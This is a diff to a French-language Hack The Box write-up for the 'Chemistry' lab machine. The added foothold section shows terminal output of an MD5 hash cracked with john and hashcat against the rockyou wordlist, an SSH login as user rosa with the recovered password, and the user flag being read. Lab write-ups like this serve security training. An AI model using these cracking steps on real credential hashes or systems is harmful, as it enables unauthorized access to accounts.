@@ -465,9 +465,140 @@ Port 5000 (http)
 
 ## Exploitation – Prise pied (Foothold)
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+
+
+```bash
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
+└─$ echo "63ed86ee9f624c7b14f1d4f43dc251a5" > hash.txt
+                                                                                                                       
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
+└─$ john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+unicorniosrosados (?)     
+1g 0:00:00:00 DONE (2026-02-14 10:55) 8.333g/s 24848Kp/s 24848Kc/s 24848KC/s unihmaryanih..unicornios2805
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                       
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
+└─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
+hashcat (v7.1.2) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12600K, 6974/13949 MB (2048 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 513 MB (13423 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 63ed86ee9f624c7b14f1d4f43dc251a5
+Time.Started.....: Sat Feb 14 10:56:11 2026, (1 sec)
+Time.Estimated...: Sat Feb 14 10:56:12 2026, (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  7675.0 kH/s (0.13ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2985984/14344385 (20.82%)
+Rejected.........: 0/2985984 (0.00%)
+Restore.Point....: 2981888/14344385 (20.79%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: unicornn -> unc112886
+Hardware.Mon.#01.: Util: 19%
+
+Started: Sat Feb 14 10:56:01 2026
+Stopped: Sat Feb 14 10:56:13 2026
+                                                                                                                       
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
+└─$
+```
+
+
+
+```bash
+                                                                                                                       
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
+└─$ ssh rosa@chemistry.htb       
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+rosa@chemistry.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat 14 Feb 2026 10:00:17 AM UTC
+
+  System load:           0.0
+  Usage of /:            72.6% of 5.08GB
+  Memory usage:          23%
+  Swap usage:            0%
+  Processes:             231
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.231.170
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:b788
+
+...
+
+rosa@chemistry:~$ 
+```
+
+
+
+
+
+```bash
+rosa@chemistry:~$ ls -l
+total 4
+-rw-r----- 1 root rosa 33 Feb 14 08:56 user.txt
+rosa@chemistry:~$ cat user.txt
+35afxxxxxxxxxxxxxxxxxxxxxxxxxxxac29
+```
+
+
 
 ---
 
